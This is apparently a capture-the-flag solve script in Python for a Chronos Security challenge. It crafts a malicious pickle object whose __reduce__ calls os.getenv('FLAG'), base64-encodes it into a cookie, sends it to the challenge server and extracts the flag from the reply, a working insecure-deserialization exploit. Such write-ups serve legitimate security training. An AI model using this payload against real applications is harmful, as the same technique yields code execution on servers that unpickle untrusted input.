#!/usr/bin/python3

#|###############################|#
#| Chronos Security | Marin Radu |#
#| https://chronossec.site       |#
#| https://github.com/ChronosPK  |#
#|###############################|#

import pickle
import base64
import os

# python3 solve.py chal.chronossec.site 30150

class pwn:
    def __reduce__(self):
        return (os.getenv, ('FLAG',))

pickled = pickle.dumps([pwn()])
payload = base64.urlsafe_b64encode(pickled).decode()
# print(payload)


###################

import requests
import sys
import re

domain = str(sys.argv[1])
port = int(sys.argv[2])

r = requests.get(url=f"http://{domain}:{port}",headers={"Cookie": f"contents={payload}"})

flag_pattern = r'CSCTF\{[^\}]+\}'
match = re.search(flag_pattern, r.text)
if match:
    print(match.group())
else:
    print('Flag not found')